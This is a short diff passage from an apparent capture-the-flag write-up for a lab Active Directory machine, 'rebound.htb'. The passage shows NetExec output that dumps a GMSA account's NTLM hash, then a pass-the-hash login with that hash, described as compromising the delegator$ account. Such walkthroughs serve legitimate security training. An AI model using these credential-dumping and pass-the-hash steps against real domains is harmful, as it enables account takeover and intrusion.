@@ -431,4 +431,13 @@ LDAP        10.129.14.17    389    DC01             [+] rebound.htb\tbrady:543BO
 LDAP        10.129.14.17    389    DC01             [*] Getting GMSA Passwords
 LDAP        10.129.14.17    389    DC01             Account: delegator$           NTLM: aafb74ba2eb5e5ff7003a9a54ad1f904     PrincipalsAllowedToReadPassword: tbrady
 ```
-I 
+I have dumped the NTLM of the `delegator$` machine account
+
+```python
+nxc smb dc01.rebound.htb -u 'delegator$' -H 'aafb74ba2eb5e5ff7003a9a54ad1f904'
+SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\delegator$:aafb74ba2eb5e5ff7003a9a54ad1f904
+```
+This account is compromised
+
+
